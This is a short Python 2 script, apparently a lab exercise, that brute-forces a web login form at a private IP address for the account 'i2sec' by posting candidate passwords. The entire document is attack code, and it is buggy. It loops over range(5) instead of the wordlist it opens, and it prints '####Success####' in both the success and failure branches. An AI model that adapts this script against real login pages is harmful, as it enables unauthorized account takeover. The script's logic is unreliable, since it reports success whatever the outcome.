import urllib, urllib2

url = "http://192.168.177.132:1111/login"
user_login = "i2sec"
wordlist = open('wordlist.txt', 'r')
passwords = wordlist.read()
#print passwords
for password in range(5):#passwords:
    print password
    #password = password.strip()
    values = {'user_id':user_login, 'user_pw':password}
    data = urllib.urlencode(values)
    request = urllib2.Request(url, data)
    response = urllib2.urlopen(request)
    
    try:
        idx = response.geturl().index('/login_chk')
        print "idx : {}".format(idx)
    except:
        idx=0
        
    if idx > 0:
        print "idx : {}".format(idx)
        print "####Success####{}".format(password)
        break
    else:
        print "####Success####{}".format(password)
wordlist.close()

    
